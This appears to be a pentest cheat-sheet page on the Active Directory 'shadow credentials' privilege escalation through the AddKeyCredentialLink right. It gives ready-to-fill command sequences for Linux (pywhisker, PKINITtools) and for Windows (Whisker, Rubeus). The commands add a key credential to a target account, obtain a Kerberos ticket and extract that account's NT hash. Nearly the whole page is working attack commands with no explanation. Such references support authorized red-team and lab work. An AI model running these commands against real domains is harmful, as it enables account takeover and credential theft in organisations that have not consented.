---
title: "AddKeyCredentialLink"
date: 2024-7-31
tags: ["AddKeyCredentialLink", "active driectory", "ad", "Windows", "shadow credentials", "whisker", "pywhisker"]
---

### Privesc #1: Shadow credentials

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Pre-check \[optional\]

<div>

```console
python3 pywhisker.py --action list -d <DOMAIN> -u <CURRENT_USER> -p '<PASSWORD>' --dc-ip <DC> -t <TARGET_USER> --use-ldaps
```

</div>

#### 1. Add shadow credentials

<div>

```console
python3 pywhisker.py --action add -d <DOMAIN> -u <CURRENT_USER> -p '<PASSWORD>' --dc-ip <DC> -t <TARGET_USER> --use-ldaps
```

</div>

<br>

<div>

```console
# Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type'
pip3 install -I pyopenssl==24.0.0
```

</div>

#### 2. Request TGT using PFX file

<div>

```console
sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<PFX_PASSWORD>' '<DOMAIN>/<USERNAME>' <USERNAME>.ccache -dc-ip <DC>
```

</div>

#### 3. Import ticket

<div>

```console
export KRB5CCNAME=<USERNAME>.ccache
```

</div>

#### 4. Get NT hash

<div>

```console
python3 getnthash.py '<DOMAIN>/<USERNAME>' -key <AS_REP_ENC_KEY>
```

</div>

<small>*Ref: [pywhisker](https://github.com/ShutdownRepo/pywhisker)*</small>
<br>
<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 0. Pre-check \[optional\]

<div>

```console
.\Whisker.exe list /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC>
```

</div>

#### 1. Add shadow credentials

<div>

```console
.\Whisker.exe add /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC> /password:'<PASSWORD>'
```

</div>

#### 2. Request TGT using PFX file and get NT hash

<div>

```console
.\rubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_CERT> /password:'<PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
```

</div>

<small>*Ref: [Whisker.exe](https://github.com/eladshamir/Whisker)*</small>

{{< /tabcontent >}}

<br>
